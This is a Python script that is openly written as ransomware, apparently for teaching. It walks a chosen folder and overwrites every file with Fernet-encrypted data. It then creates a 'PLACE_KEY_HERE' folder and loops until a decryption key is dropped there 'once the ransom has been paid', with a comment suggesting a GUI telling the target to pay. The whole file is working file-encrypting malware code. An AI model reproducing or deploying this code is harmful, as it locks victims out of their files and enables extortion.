class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

from cryptography.fernet import Fernet
import os
import time

# Fernet is a useful Python package that makes
# encryption easy.

# It is based on AES, a symmetric type of encryption,
# using the SAME key to encrpyt and decrypt

def main():

	# Defining a specific location to encrypt. Most
	# ransomware will usually target your "Documents" or
	# "Desktop" folders; places where you usually have
	# important files

	test_path = "/home/eric/Desktop/bob's_file_system"
	# test_path = "/home/eric/Desktop/test"

	print(f"{bcolors.OKGREEN}[+] Path specified\n")



	# Now lets open our "local" AES key, the one that
	# we will be using on the target system to encrypt

	with open("local.key", "rb") as keyfile:
		key = keyfile.read()
	fernet_key = Fernet(key)

	print(f"[+] Local Key has been loaded\n{bcolors.ENDC}")
	


	## Encryption ########################################

	# Lets begin encrypting! We will now pass the 
	# path we want to encrypt, and the the key itself

	print(f"{bcolors.OKCYAN}[+] Running encryption ...\n{bcolors.ENDC}")
	
	encrypt(test_path, fernet_key)

	print(f"{bcolors.OKGREEN}[+] Files encrypted >:,)\n{bcolors.ENDC}")
	######################################################

	

	# We now create a location for the target to place the decryption key
	# once the ransom has been paid

	if os.path.exists("../PLACE_KEY_HERE"):
		pass
	else:
		os.mkdir("../PLACE_KEY_HERE")


	# (Optional Step)

	# Make a GUI telling the target that it's clipped fr
	# unless they pay up



	## Decryption ########################################

	# Placing the key in the 'PLACE_KEY_HERE' folder will cause the 
	# infinte loop to break and to decrypt the affected drive
	while "local.key" not in os.listdir("../PLACE_KEY_HERE"):
		time.sleep(2)
		print("[!] Waiting for decryption key ...")


	with open("../PLACE_KEY_HERE/local.key", "rb") as keyfile:
		key = keyfile.read()
	fernet = Fernet(key)


	print(f"{bcolors.OKCYAN}[+] Running decryption\n{bcolors.ENDC}")

	decrypt(test_path, fernet_key)
	
	print(f"{bcolors.OKGREEN}[+] Files decrypted :,)\n{bcolors.ENDC}")

	#########################################################




def encrypt(path, token):
	
	# Recursive iteration with os.walk:
	for (root, dirs, files) in os.walk(path):

		####################################################
		# print(f"Current Folder: {root}")
		# print(f"Other folders in current folder: {dirs}")
		# print(f"Files in current folder: {files}")
		# print("\n")
		####################################################

		for file in files:
			# Abs. file path variable
			path_to_file = f"{root}/{file}"

			# Reading original file data
			with open(path_to_file, "rb") as file:
				data = file.read()

			# Encrypting file data
			encrypted_data = token.encrypt(data)

			# Overwiting original file data
			with open(path_to_file, "wb") as file:
				file.write(encrypted_data)




def decrypt(path, token):
	
	# Recursive iteration with os.walk:
	for (root, dirs, files) in os.walk(path):

		for file in files:
			# Abs. file path variable
			path_to_file = f"{root}/{file}"

			# Reading encrypted file data
			with open(path_to_file, "rb") as file:
				encrypted_data = file.read()

			# Decrypting file data
			decrypted_data = token.decrypt(encrypted_data)

			# Overwiting original file data
			with open(path_to_file, "wb") as file:
				file.write(decrypted_data)


main()





